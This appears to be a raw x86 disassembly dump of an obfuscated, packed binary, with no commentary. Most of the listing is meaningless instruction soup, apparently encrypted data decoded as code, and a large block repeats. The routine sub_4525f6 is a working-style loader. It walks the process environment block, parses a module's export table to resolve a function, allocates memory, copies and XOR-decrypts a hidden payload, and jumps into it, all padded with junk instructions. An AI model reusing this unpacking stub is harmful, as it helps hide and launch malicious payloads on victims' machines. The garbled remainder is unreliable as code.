or [ esi + 0x7f35abae ] edx
aam 0xfc
jne r-xdata
xor eax 0x1f35b958
pop esi
jpo r-xdata
jg r-xdata
mov ecx 0x34d01f35
xchg ecx eax
cmp al 0x4b
ja r-xdata
shl [ esi ] 0x1
int1
fdivr [ esi - 0x34cfa8fe ]
div [ ebx + 0x5f ]
add [ eax + 0x3 ] edx
push 0xf46db95b
inc esi
mov [ 0xffffffffd29641b9 ] eax
cld
push esi
xor esp edi
test eax 0xb6b95b7f
xchg [ ecx - 0x3c ] edx
pop edi
stosb [ edi ]
xor eax 0x71fcd47f
xchg esi eax
mov ecx 0xd358f635
jne r-xdata
mov al [ 0x5f73f638 ]
mov ecx 0xb949b2dc
xor eax 0x3935b325
jg r-xdata
shl [ ecx + edx * 4 ] 0x1
pop ds
jg r-xdata
dec ecx
mov ecx 0x35b32535
cmp [ edi + 0x5b ] edi
mov ecx 0xb94d7bdc
xor eax 0x23b1b227
jg r-xdata
pop ebx
mov ecx 0xbe9fe0bc
xor eax 0x65e6d07f
test ah 0x71
xor bh [ edi + 0x5b ]
xor ch [ edx + 0x2b ]
shl [ esi ] cl
stc
js r-xdata
pop ebx
xor [ eax + 0x27 ] dh
mov ch 0x62
xchg edi eax
push eax
mov ch 0x35
jg r-xdata
inc edi
pop edx
mov dh 0xb1
jmp 0xffffffffba452120
pop ebx
mov ecx 0x305bf46d
jo r-xdata
jmp 0xffffffffb998fcbb
pop ebx
mov ecx 0xb14fc0b6
xor eax 0xb1b65b7f
ror edx cl
int 0x7f
das
dec ebx
pop edi
aas
xor edi [ ecx + 0x465b7f05 ]
xor [ edi + 0x53 ] 0xb9
xor eax 0x3db9ec80
jg r-xdata
pop ebx
mov ecx 0x3a6f2aca
mov ecx 0x321b90b6
mov dl 0xbf
pop ebx
mov ecx 0xaddcf635
cmp eax 0xb2325b7f
jg r-xdata
add [ 0xfffffffff7b95b7f ] esi
ja r-xdata
dec [ ecx ]
hlt
jg r-xdata
mov dl 0x46
and edi [ edi + 0x5b ]
loope r-xdata
dec edi
push ecx
xor dh [ edx + 0x35b95773 ]
cld
mov [ 0xffffffffc3fb3ab9 ] eax
mov ecx 0x3e587f35
xor eax 0xbcb95b77
cmp cl [ ebx + 0x32 ]
mov dl 0x7f
push edi
mov ecx 0xcc9bfa35
xor esi esp
ja r-xdata
mov ecx 0xa1dcf635
cmp eax 0x6a325b7f
inc ebx
fidivr [ edx - 0x33 ]
jg r-xdata
jpe r-xdata
sbb eax 0xe35b7f27
fld [ 0xffffffff9435b957 ]
dec eax
jecxz r-xdata
aas
sbb [ 0xffffffffbeb95b7f ] al
aas
push edi
xor dh [ ebp + 0x73 ]
mov ecx 0xb54be0be
xor eax 0x3526587f
ja r-xdata
mov ecx 0xefa87e6b
mov esp 0xf33a057c
jpo r-xdata
xor eax 0x34b95b77
test al 0xb3
xor eax 0x25fc9c7f
jg r-xdata
or [ esi ] 0xb1
mov dh 0x87
mov ecx 0xb9ec8035
cmp eax 0xcad35b7f
pop ebx
int 0xd6
mul [ ebp + 0x4b7ff338 ]
mov ecx 0xe8924e35
0x4b09
mov ecx 0x7fd8256e
sbb eax 0x779198fc
sub eax 0x77312e62
pop ebx
mov ecx 0xea4a040
xor eax 0xcab95b77
sub ch [ edi + 0x3a ]
mov ecx 0xb14be0bc
xor eax 0xb447d27f
mov ecx 0x7f35a95b
push 0x6b
sub al 0x31
xchg ecx eax
mov esi 0xedb8573a
das
or eax 0x5b744051
shl ah 0x1
fadd [ 0x2435b94d ]
clc
xor eax 0x5b510b7f
ja r-xdata
out 0x1d al
test ah 0xa9
cmp eax 0xbedf5b7f
and [ ebp - 0x21 ] bl
mov esp 0x35be9fe0
jg r-xdata
sub al 0x9
fnstsw [ esi + 0x35b94372 ]
jg r-xdata
add al [ ebx ]
mov eax 0xb207fb3a
xor eax 0x5183f7f
jg r-xdata
mov ecx 0x305b7f35
jge r-xdata
shl [ esi ] 0x1
cmp eax 0xdeb95b77
jpe r-xdata
mov ecx 0xefa87e6b
mov esp 0xbe9bb07c
ficomp [ bp + si - 0x36 ]
sbb [ ebx - 0x47 ] 0xbc
and cl [ edi + 0x51 ]
mov esi [ ebp + 0x5b ]
mov ecx 0xb54be0be
xor eax 0x3526587f
ja r-xdata
xlat
jne r-xdata
push edx
adc dh ah
inc ebx
mov edx 0xb9537faa
xor eax 0xbcbb98fc
and cl [ edi + 0x51 ]
sub ch [ ebx + 0x26 ]
fdivr [ eax + 0x21 ]
xchg esi eax
insb
inc esi
0xb380
fsubr [ ecx + 0x305b7f39 ]
mov dl 0x7f
push edi
mov ecx 0xefad4e35
mov esi 0x35b55bf8
mov ecx 0xad1eb835
xor eax 0xb6b95b7f
ror [ edi - 0x4f ] 0x35
jg r-xdata
mov ch 0x34
mov esp 0x17757ed8
mov [ 0x87f35b9 ] eax
out dx al
fisttp [ ebx - 0xbca46b0 ]
add al 0x8d
mov esp 0x35be9be0
jg r-xdata
js r-xdata
int1
xor al 0x91
movsb [ edi ] [ esi ]
imul ebx esi 0xca51b36a
and [ esi + eax * 2 + 0x465f5b41 ] 0x61
pop ebx
push edi
[ esi ] ebp
fdivr [ edi + 0x1d ]
mov ecx 0x32573fbe
jne r-xdata
jg r-xdata
ror [ esi ] 0x1
xor eax 0xbcb95b77
cmovae edi [ edx - 0x46acd07e ]
xor eax 0xb6a52bf6
add al [ ebx ]
mov eax 0x47d22b41
mov ah 0xb9
pop ebx
test eax 0x706a7f35
mul [ fs : ebx + 0x5b7335bc ]
mov ecx 0xb21a9765
xor eax 0x4346087f
add edi [ eax + 0x47d22b41 ]
jg r-xdata
pop ebx
mov ch 0x35
mov dh 0x5b
mov ecx 0xed02e35
and [ edi + 0x5b ] esi
mov ecx 0xb15bf8be
xor eax 0x34495a7f
mov bh 0x31
lodsd [ esi ]
mul [ gs : eax + 0x577ff638 ]
mov ecx 0xfb32c35
aas
jg r-xdata
mov dh 0xb1
ja r-xdata
ja r-xdata
inc esi
inc ebx
xor eax 0x65b95b77
adc eax 0x1f6046a4
mov ecx 0xba430fbc
sub [ edi ] 0x53
mov ecx 0xa52bf635
mov dh 0x2
pushad
xor [ ss : edi + 0x5b ] esi
mov ecx 0x41d2ad40
xor [ edi + 0x57 ] bh
mov ecx 0xbb312f35
0x57c8
xor eax 0x36b95b77
cmp [ edi - 0x17 ] edx
pop edi
and [ esp + ebp * 8 + 0x7fd82655 ] 0x1d
shl bh 0x1
add esi esi
adc al 0xbd
mov esi 0xba300b31
adc ebx [ edx - 0x47 ]
xor eax 0xbcb526f4
xchg al bl
js r-xdata
shr [ esi ] 0x1
ja r-xdata
mov ecx 0x46a41565
pushad
pop ds
pop edx
mov ecx 0xb526f435
mov esp 0x7d78d886
mov ecx 0xb15be836
xor eax 0x38323f7f
mov [ 0x16fa3ab8 ] eax
not [ esi * 4 + 0x301fbeb6 ]
jpe r-xdata
inc esi
0xd080
cli
fdivr [ eax + 0x25 ]
not [ ecx + ebp * 4 ]
pop ebx
mov ecx 0xbd1af435
mov esp 0x6530af2f
mov [ 0xffffffff94b67ad2 ] eax
xor [ si ] ch
cld
cwde
test [ esi - 0x16cfd06c ] esi
cld
cwde
mov cl 0xbc
mov [ 0xfffffffff40578d8 ] al
inc edx
mov ah bh
dec esi
lodsd [ esi ]
mov dl cl
cmp [ ecx - 0x2d8cb7ce ] 0x41
xor [ ebp - 0x9ca46e6 ] bh
push ds
in eax dx
mov esi 0x44320f32
inc ebx
pop edx
ja r-xdata
dec eax
mov ah 0xbe
mov edi [ ecx - 0x92d80cb ]
jno r-xdata
adc al 0xa9
push ss
mov ebp 0xb94b1bdc
xor eax 0x3cb9b325
jg r-xdata
push ss
inc esi
in eax 0xf6
push ds
rcr ebp 0x1
adc eax 0xf635b953
push ds
aad 0xbc
xchg [ esi + 0x45 ] ebx
cmp bh [ edi + 0x5b ]
xor bh [ eax + 0x27 ]
shl [ ecx - 0x32a4794a ] cl
cmp esi esp
push ds
in eax dx
mov esi 0xedb86727
sbb [ ecx + edi * 8 + 0x325b7f21 ] ebx
js r-xdata
enter 0xb837 0x35
jg r-xdata
mov dl 0x86
and eax 0xdde35b7f
mov ecx 0x8035b953
sub al 0xb1
0x5708
inc esi
in eax 0xfc
into
xor esp esi
adc al 0xb1
0xa44e
sub_4525f6
mov eax [ fs : 0x30 ]
push di
pop di
mov eax [ eax + 0xc ]
jmp r-xdata
mov eax [ eax + 0x14 ]
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
mov eax [ eax ]
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov ebx [ eax + 0x28 ]
push di
pop di
mov edi 0x53004d
push di
pop di
cmp [ ebx ] edi
jne r-xdata
inc ebx
dec esp
mov [ ebp + 0x10 ] cl
cmp [ ebx + 0x4 ] r-xdata
jne r-xdata
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
mov esi [ eax + 0x10 ]
push si
pop si
push esi
push di
pop di
mov ebx [ esi + 0x3c ]
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov esi [ esp ]
push di
pop di
add esi ebx
push di
pop di
mov ebx [ esi + 0x78 ]
jmp r-xdata
inc ebx
dec esp
mov eax [ esp ]
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
add eax ebx
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov esi eax
push di
pop di
add esi 0x28
push di
pop di
inc ebx
dec esp
lodsd [ esi ]
mov [ ebp + 0x10 ] cl
test eax eax
je r-xdata
add eax [ esp ]
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
mov ebx 0x548bec83
bswap ebx
inc ebx
cmp [ eax ] ebx
jne r-xdata
inc ebx
dec esp
push si
pop si
cmp [ eax + 0x4 ] 0x8d560cec
jne r-xdata
pop ebx
push di
pop di
xor ebx ebx
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push ebx
push di
pop di
push ebx
push di
pop di
push ebx
jmp r-xdata
push esp
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
push 0x42000
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push edx
push di
pop di
push ecx
push di
pop di
push esp
mov [ ebp + 0x10 ] cl
call eax
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
inc ebx
dec esp
add esp 0x1c
push si
pop si
retn
inc ebx
dec esp
sub_452903
push di
pop di
pop esi
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov ecx 0x2f84
push di
pop di
jmp r-xdata
push si
pop si
push di
pop di
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push si
pop si
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ ebp + 0x10 ] cl
jmp r-xdata
jmp r-xdata
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ ebp + 0x10 ] cl
dec cx
jmp r-xdata
inc ebx
dec esp
dec cx
jmp r-xdata
sub ecx 0x2
test ecx ecx
jne r-xdata
push si
pop si
mov ebx [ esi + ecx ]
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ eax + ecx ] ebx
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ ebp + 0x10 ] cl
jmp r-xdata
push di
pop di
mov ebx [ esi + ecx ]
mov [ eax + ecx ] ebx
mov ebx 0x5b7f35b9
jmp r-xdata
xor edi edi
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
mov [ ebp + 0x3c ] 0x2f84
inc ebx
dec esp
xor esi ebx
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov [ edx ] 0x0
mov [ ebp + 0x10 ] cl
xor [ edx ] esi
push si
pop si
push di
pop di
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
add di 0x4
jmp r-xdata
jmp r-xdata
cmp edi [ ebp + 0x3c ]
jne r-xdata
mov [ ebp + 0x10 ] cl
push eax
mov [ ebp + 0x10 ] cl
pop edx
push si
pop si
add edx edi
push [ ebp + 0x10 ]
pop [ ebp + 0x10 ]
mov esi [ edx ]
mov [ ebp + 0x10 ] cl
jmp r-xdata
jmp r-xdata
add esp 0xc
add esp 0xc
push di
pop di
call eax
jmp r-xdata
mov [ ebp + 0xc ] 0x18
cmp [ ebp + 0xc ] 0x18
je r-xdata
call sub_452903
in al dx
mov esp 0x2d183f9a
jg r-xdata
inc ebx
dec esp
mov dl 0x29
and edi [ edi + 0x5b ]
mov ecx 0x396b3fbe
dec ebp
jge r-xdata
bswap ebx
sub [ ecx ] ecx
andps xmm7 [ 0xffffffffb95b7c23 ]
lea edi [ esi + 0x5b ]
mov ecx 0x30f97035
in eax 0xbe
mov bl 0xae
mov dh 0x9f
mov dh 0xb1
dec esi
pop eax
mov ecx 0xddcbef35
xchg esp eax
dec edi
pop ebx
mov ecx 0x33cbef35
jne r-xdata
loop r-xdata
cmp al 0xcb
jge r-xdata
pop edx
cmp cl ch
jle r-xdata
mov esi 0x9fb6aeb3

pop ebx
out dx al
0x4f2e
pop ss
pop ebx
test eax 0xb1317f35
or [ ebx + 0x4d54dce9 ] 0xb9
xor eax 0x238ab226
jg r-xdata
mov ebp ecx
fcom [ ebp + ecx * 2 - 0x47 ]
mov ecx 0xb94c51dc
xor eax 0x31f4d226
xchg esi eax
mov eax [ ss : 0x51017f35 ]
mov dh 0x6f
pop ebx
mov ecx 0xb9cffabc
xor eax 0x2329b27f
jg r-xdata
fadd [ ecx + 0x35 ]
jo r-xdata
jecxz r-xdata
or bl dl
xor eax 0xcaee5b15
dec edi
cmp [ esi ] cl
sub eax 0xa71e91f
push edx
cmp [ esi + 0x7b ] cl
pop ds
xchg edi eax
push ecx
adc ebp [ edi ]
loop r-xdata
loopne r-xdata
sti
mov edi 0xd27f35b8
inc ecx
outsd
jpe r-xdata
pop ebx
fnstsw [ esi + 0x35b96b62 ]
jg r-xdata
push ebp
dec ebx
mov ecx 0xd39df635
adc eax 0xbce28b80
mov eax [ 0x77be7ed2 ]
imul edi [ ecx - 0x1d2f80cb ] 0x2d
inc esp
pop ebx
mov dh 0xb1
mov ds [ edx - 0x47 ]
xor eax 0x37b9e0ff
jg r-xdata
adc eax 0x1be5465e
jg r-xdata
cli
lea esi [ 0xffffffffcd3a5b7f ]
pop esi
inc esi
in eax 0x1b
hlt
mov ecx 0xb8bffb3a
xor eax 0x6f41d27f
sub eax 0xe15b7f35
or [ gs : ebx + 0x5b7f1184 ] 0xf9
cmp al 0xdb
jle r-xdata
pop edi
mov ecx 0x19ce8035
xor eax 0x35d35b7f
or dh 0x19
xor eax 0x35845b7f
jpo r-xdata
xor cl [ esi ]
hlt
scasb [ edi ]
loope r-xdata
inc ecx
jle r-xdata
pop ebx
stc
mov ecx 0x505f32be
push cs
imul ebx [ ebx - 0x47 ] 0xb622976f
xor eax 0x953cd27f
jg r-xdata
pop ebx
shl [ 0x35d35b15 ] cl
mov ecx 0xb8e7fd3a
add [ ecx - 0x6a ] edx
jno r-xdata
xchg edi eax
mov ah 0xa8
xor eax 0x31f4d07f
xchg esi eax
mov esi 0x17f35ac
push ecx
shl [ ecx + 0x5b ] cl
mov ecx 0xd35b1565
xor eax 0x35d35b15
jo r-xdata
cld
movsd [ edi ] [ esi ]
xor eax 0x3651017f
jo r-xdata
pop ebx
mov ecx 0xb9cfeaca
xor eax 0x45f4d07f
xchg esi eax
mov ecx 0xb95f7f5d
xor eax 0x3519ce80
jg r-xdata
jg r-xdata
mov dl 0x5c
and [ edi + 0x5b ] bh
jecxz r-xdata
shl ah 0x1
xor [ esi + 0x7f35acbe ] edx
add [ ecx - 0x2e ] edx
jno r-xdata
loopne r-xdata
shl ah 0x1
mov ecx 0x326b3abc
js r-xdata
cmp ah [ ebx ]
push eax
shl ah 0x1
xor [ esi + 0x7f35ac94 ] edx
mov bl 0xd
cmp edi [ edi + 0x5b ]
xor [ eax + 0x53 ] dh
scasb [ edi ]
shl [ 0x3519ce80 ] cl
jg r-xdata
in eax 0x6b
pop ebx
mov ecx 0xad83966c
xor eax 0x7e51017f
jno r-xdata
push 0x71
pop ebx
push ecx
pop ebx
shl [ 0x35a8b497 ] cl
jg r-xdata
test eax 0xf635b955
push ds
popfd
mov esi 0x37505f32
imul ebx [ ebx - 0x47 ] 0xb79e976f
pop edi
push eax
pop esp
mov ecx 0x327b3abc
js r-xdata
jg r-xdata
xor ch [ ebx ]
push eax
push esp
push 0x976fb95b
sbb dh [ esi + 0x4f6a7f35 ]
add al 0x80
or edx ebx
cmp al [ eax + 0x7f352dce ]
mov ecx 0xd3533abc
xor [ edi ] edx
pop ebx
test eax 0xb9337f35
mov ch 0x7f
pop ebx
shl [ 0x6046a415 ] cl
jg r-xdata
mov dl 0x45
and [ edi + 0x5b ] edi
jecxz r-xdata
pop ebx
xor [ esi + 0x7f35ac54 ] edx
add [ ecx + 0xe ] edx
mov ecx 0xf4d0b8bc
pop ebx
xor eax 0x22e6b27f
jg r-xdata
test [ 0x3ab95b7b ] dh
std
out 0xb8 eax
cdq
inc eax
fwait
fadd [ esi + 0x31 ]
add [ eax - 0x2f ] edx
jne r-xdata
hlt
pop ebx
loope r-xdata
jpe r-xdata
cmp cl ch
xor eax 0x1dfcd27f
hlt
pop ebx
mov ecx 0xb79e976f
or [ ebx + 0x5b7f1184 ] 0xf9
jg r-xdata
jg r-xdata
jno r-xdata
push esp
lodsb [ esi ]
xor eax 0xe51017f
mov ecx 0x460b2b35
loop r-xdata
push 0x5b
mov ecx 0xb7da976f
xor eax 0x55fcd27f
hlt
in eax dx
push ebp
mov ecx 0x8d1ef635
mov esi 0x5c505f32
js r-xdata
fwait
dec ebp
mov ecx 0x5db32535
cmp [ edi + 0x5b ] bh
mov dh ch
test dh 0x25
xor eax 0x1e525b7f
jle r-xdata
push ecx
push ecx
les ebx [ edi + edx ]
jmp ebp
in eax 0xb5
xor al 0x7f
pop ebx
leave
cmp edi [ edi + 0x5b ]
xor [ eax + 0x33 ] dh
shl ah 0x1
xor [ esi + 0x7f35af5f ] edx
add [ ecx + 0x6a ] edx
jno r-xdata
cmp eax 0x35be5b7f
daa
mov dl 0x4a
and [ edi + 0x5b ] bh
cld
and al 0xd2
push eax
mov ah 0xbe
push edx
push ds
pop ebx
mov ch 0x34
jg r-xdata
sub al 0xa1
jg r-xdata
ja r-xdata
test [ esi - 0x47 ] ecx
xor eax 0x3841b325
jg r-xdata
loopne r-xdata
pop ebx
mov ecx 0x50233abc
pop ebx
mov ecx 0xfc9c7840
aam 0xfc
jno r-xdata
mov ecx 0x2ca47cf8
test eax 0xddb95b7f
scasd [ edi ]
movsb [ edi ] [ esi ]
pop ebx
jpo r-xdata
loopne r-xdata
xor [ eax + 0x2f ] dh
mov dl 0x67
and edi [ edi + 0x5b ]
or edi [ edx + 0x35 ]
jg r-xdata
sbb al 0x17
shr [ edi + 0x30037f35 ] 0x1
jg r-xdata
daa
mov dl 0xb1
and edi [ edi + 0x5b ]
mov dl 0x15
and bh [ edi + 0x5b ]
loope r-xdata
sub al 0xa9
jg r-xdata
mov ecx 0xd3537f35
jne r-xdata
jg r-xdata
int1
dec esp
mov ecx 0xcca42635
or eax 0x6466b80
sar ah 0x1
cmp [ edx - 0x67 ] edi
jg r-xdata
cmp al [ edi + 0x39 ]
or eax 0x6d3d547e
jne r-xdata
jo r-xdata
add esi [ eax ]
0x17f4
mov ecx 0x46a4afdd
xchg esi eax
pushfd
scasd [ edi ]
xor eax 0xdfcd47f
xchg esi eax
shr [ edi - 0x32b80cb ] 0x9
xchg esi eax
scasb [ edi ]
stosd [ edi ]
xor eax 0x75fcd47f
xchg esi eax
pop ebx
mov [ 0x35d30c7f ] esi
adc eax 0x776046a4
fcom [ esi + 0x31 ]
cld
mov ecx 0xf4d02435
cld
sub esp edi
arpl [ eax - 0x154c8ec0 ] di
and al 0x7f
pop ebx
cmp cl ch
jle r-xdata
shl al 0x1
adc [ esi ] ebp
mov ecx 0xbc573abe
idiv [ esi ]
pop ebx
mov ecx 0x7f167ff3
jne r-xdata
cmp [ esi + 0x7f35af9c ] edx
aam 0xfc
or eax 0x35afc196
jg r-xdata
mov ecx 0xfcd29641
shl [ 0x6046a415 ] cl
ja r-xdata
loop r-xdata
pop ebx
cmp esp esi
dec ebx
xor [ ebx + edi * 2 - 0x69ca46b9 ] ah
out 0x9e eax
xor eax 0x4046027f
inc edi
movsb [ edi ] [ esi ]
mov cl dl
dec edi
or dh [ edx ]
jo r-xdata
mov ecx 0x3a433abe
or eax 0xdcf12f7f
add eax 0x2435b94d
cld
or [ esi + 0x7f35abae ] edx
aam 0xfc
jne r-xdata
xor eax 0x1f35b958
pop esi
jpo r-xdata
jg r-xdata
mov ecx 0x34d01f35
xchg ecx eax
cmp al 0x4b
ja r-xdata
shl [ esi ] 0x1
int1
fdivr [ esi - 0x34cfa8fe ]
div [ ebx + 0x5f ]
add [ eax + 0x3 ] edx
push 0xf46db95b
inc esi
mov [ 0xffffffffd29641b9 ] eax
cld
push esi
xor esp edi
test eax 0xb6b95b7f
xchg [ ecx - 0x3c ] edx
pop edi
stosb [ edi ]
xor eax 0x71fcd47f
xchg esi eax
mov ecx 0xd358f635
jne r-xdata
mov al [ 0x5f73f638 ]
mov ecx 0xb949b2dc
xor eax 0x3935b325
jg r-xdata
shl [ ecx + edx * 4 ] 0x1
pop ds
jg r-xdata
dec ecx
mov ecx 0x35b32535
cmp [ edi + 0x5b ] edi
mov ecx 0xb94d7bdc
xor eax 0x23b1b227
jg r-xdata
pop ebx
mov ecx 0xbe9fe0bc
xor eax 0x65e6d07f
test ah 0x71
xor bh [ edi + 0x5b ]
xor ch [ edx + 0x2b ]
shl [ esi ] cl
stc
js r-xdata
pop ebx
xor [ eax + 0x27 ] dh
mov ch 0x62
xchg edi eax
push eax
mov ch 0x35
jg r-xdata
inc edi
pop edx
mov dh 0xb1
jmp 0xffffffffba452120
pop ebx
mov ecx 0x305bf46d
jo r-xdata
jmp 0xffffffffb998fcbb
pop ebx
mov ecx 0xb14fc0b6
xor eax 0xb1b65b7f
ror edx cl
int 0x7f
das
dec ebx
pop edi
aas
xor edi [ ecx + 0x465b7f05 ]
xor [ edi + 0x53 ] 0xb9
xor eax 0x3db9ec80
jg r-xdata
pop ebx
mov ecx 0x3a6f2aca
mov ecx 0x321b90b6
mov dl 0xbf
pop ebx
mov ecx 0xaddcf635
cmp eax 0xb2325b7f
jg r-xdata
add [ 0xfffffffff7b95b7f ] esi
ja r-xdata
dec [ ecx ]
hlt
jg r-xdata
mov dl 0x46
and edi [ edi + 0x5b ]
loope r-xdata
dec edi
push ecx
xor dh [ edx + 0x35b95773 ]
cld
mov [ 0xffffffffc3fb3ab9 ] eax
mov ecx 0x3e587f35
xor eax 0xbcb95b77
cmp cl [ ebx + 0x32 ]
mov dl 0x7f
push edi
mov ecx 0xcc9bfa35
xor esi esp
ja r-xdata
mov ecx 0xa1dcf635
cmp eax 0x6a325b7f
inc ebx
fidivr [ edx - 0x33 ]
jg r-xdata
jpe r-xdata
sbb eax 0xe35b7f27
fld [ 0xffffffff9435b957 ]
dec eax
jecxz r-xdata
aas
sbb [ 0xffffffffbeb95b7f ] al
aas
push edi
xor dh [ ebp + 0x73 ]
mov ecx 0xb54be0be
xor eax 0x3526587f
ja r-xdata
mov ecx 0xefa87e6b
mov esp 0xf33a057c
jpo r-xdata
xor eax 0x34b95b77
test al 0xb3
xor eax 0x25fc9c7f
jg r-xdata
or [ esi ] 0xb1
mov dh 0x87
mov ecx 0xb9ec8035
cmp eax 0xcad35b7f
pop ebx
int 0xd6
mul [ ebp + 0x4b7ff338 ]
mov ecx 0xe8924e35
0x4b09
mov ecx 0x7fd8256e
sbb eax 0x779198fc
sub eax 0x77312e62
pop ebx
mov ecx 0xea4a040
xor eax 0xcab95b77
sub ch [ edi + 0x3a ]
mov ecx 0xb14be0bc
xor eax 0xb447d27f
mov ecx 0x7f35a95b
push 0x6b
sub al 0x31
xchg ecx eax
mov esi 0xedb8573a
das
or eax 0x5b744051
shl ah 0x1
fadd [ 0x2435b94d ]
clc
xor eax 0x5b510b7f
ja r-xdata
out 0x1d al
test ah 0xa9
cmp eax 0xbedf5b7f
and [ ebp - 0x21 ] bl
mov esp 0x35be9fe0
jg r-xdata
sub al 0x9
fnstsw [ esi + 0x35b94372 ]
jg r-xdata
add al [ ebx ]
mov eax 0xb207fb3a
xor eax 0x5183f7f
jg r-xdata
mov ecx 0x305b7f35
jge r-xdata
shl [ esi ] 0x1
cmp eax 0xdeb95b77
jpe r-xdata
mov ecx 0xefa87e6b
mov esp 0xbe9bb07c
ficomp [ bp + si - 0x36 ]
sbb [ ebx - 0x47 ] 0xbc
and cl [ edi + 0x51 ]
mov esi [ ebp + 0x5b ]
mov ecx 0xb54be0be
xor eax 0x3526587f
ja r-xdata
xlat
jne r-xdata
push edx
adc dh ah
inc ebx
mov edx 0xb9537faa
xor eax 0xbcbb98fc
and cl [ edi + 0x51 ]
sub ch [ ebx + 0x26 ]
fdivr [ eax + 0x21 ]
xchg esi eax
insb
inc esi
0xb380
fsubr [ ecx + 0x305b7f39 ]
mov dl 0x7f
push edi
mov ecx 0xefad4e35
mov esi 0x35b55bf8
mov ecx 0xad1eb835
xor eax 0xb6b95b7f
ror [ edi - 0x4f ] 0x35
jg r-xdata
mov ch 0x34
mov esp 0x17757ed8
mov [ 0x87f35b9 ] eax
out dx al
fisttp [ ebx - 0xbca46b0 ]
add al 0x8d
mov esp 0x35be9be0
jg r-xdata
js r-xdata
int1
xor al 0x91
movsb [ edi ] [ esi ]
imul ebx esi 0xca51b36a
and [ esi + eax * 2 + 0x465f5b41 ] 0x61
pop ebx
push edi
[ esi ] ebp
fdivr [ edi + 0x1d ]
mov ecx 0x32573fbe
jne r-xdata
jg r-xdata
ror [ esi ] 0x1
xor eax 0xbcb95b77
cmovae edi [ edx - 0x46acd07e ]
xor eax 0xb6a52bf6
add al [ ebx ]
mov eax 0x47d22b41
mov ah 0xb9
pop ebx
test eax 0x706a7f35
mul [ fs : ebx + 0x5b7335bc ]
mov ecx 0xb21a9765
xor eax 0x4346087f
add edi [ eax + 0x47d22b41 ]
jg r-xdata
pop ebx
mov ch 0x35
mov dh 0x5b
mov ecx 0xed02e35
and [ edi + 0x5b ] esi
mov ecx 0xb15bf8be
xor eax 0x34495a7f
mov bh 0x31
lodsd [ esi ]
mul [ gs : eax + 0x577ff638 ]
mov ecx 0xfb32c35
aas
jg r-xdata
mov dh 0xb1
ja r-xdata
ja r-xdata
inc esi
inc ebx
xor eax 0x65b95b77
adc eax 0x1f6046a4
mov ecx 0xba430fbc
sub [ edi ] 0x53
mov ecx 0xa52bf635
mov dh 0x2
pushad
xor [ ss : edi + 0x5b ] esi
mov ecx 0x41d2ad40
xor [ edi + 0x57 ] bh
mov ecx 0xbb312f35
0x57c8
xor eax 0x36b95b77
cmp [ edi - 0x17 ] edx
pop edi
and [ esp + ebp * 8 + 0x7fd82655 ] 0x1d
shl bh 0x1
add esi esi
adc al 0xbd
mov esi 0xba300b31
adc ebx [ edx - 0x47 ]
xor eax 0xbcb526f4
xchg al bl
js r-xdata
shr [ esi ] 0x1
ja r-xdata
mov ecx 0x46a41565
pushad
pop ds
pop edx
mov ecx 0xb526f435
mov esp 0x7d78d886
mov ecx 0xb15be836
xor eax 0x38323f7f
mov [ 0x16fa3ab8 ] eax
not [ esi * 4 + 0x301fbeb6 ]
jpe r-xdata
inc esi
0xd080
cli
fdivr [ eax + 0x25 ]
not [ ecx + ebp * 4 ]
pop ebx
mov ecx 0xbd1af435
mov esp 0x6530af2f
mov [ 0xffffffff94b67ad2 ] eax
xor [ si ] ch
cld
cwde
test [ esi - 0x16cfd06c ] esi
cld
cwde
mov cl 0xbc
mov [ 0xfffffffff40578d8 ] al
inc edx
mov ah bh
dec esi
lodsd [ esi ]
mov dl cl
cmp [ ecx - 0x2d8cb7ce ] 0x41
xor [ ebp - 0x9ca46e6 ] bh
push ds
in eax dx
mov esi 0x44320f32
inc ebx
pop edx
ja r-xdata
dec eax
mov ah 0xbe
mov edi [ ecx - 0x92d80cb ]
jno r-xdata
adc al 0xa9
push ss
mov ebp 0xb94b1bdc
xor eax 0x3cb9b325
jg r-xdata
push ss
inc esi
in eax 0xf6
push ds
rcr ebp 0x1
adc eax 0xf635b953
push ds
aad 0xbc
xchg [ esi + 0x45 ] ebx
cmp bh [ edi + 0x5b ]
xor bh [ eax + 0x27 ]
shl [ ecx - 0x32a4794a ] cl
cmp esi esp
push ds
in eax dx
mov esi 0xedb86727
sbb [ ecx + edi * 8 + 0x325b7f21 ] ebx
js r-xdata
enter 0xb837 0x35
jg r-xdata
mov dl 0x86
and eax 0xdde35b7f
mov ecx 0x8035b953
sub al 0xb1
0x5708
inc esi
in eax 0xfc
into
xor esp esi
adc al 0xb1
0xa44e
sub_452b20
pop esp
out dx eax
pop edi
jg r-xdata
mov eax 0xc2da7f35
xor [ edi ] esp
pop ecx
mov ecx 0x26d77035
xor al 0x7f
pop ebx
xor bh [ eax + 0x7b ]
mov dl 0xf3
and edi [ edi + 0x5b ]
jecxz r-xdata
inc esi
pop edi
fiadd [ edx - 0x46a483eb ]
cmp dh bl
idiv [ eax - 0x3d2580cb ]
in eax 0x54
mov ecx 0x465e1535
in eax 0x1b
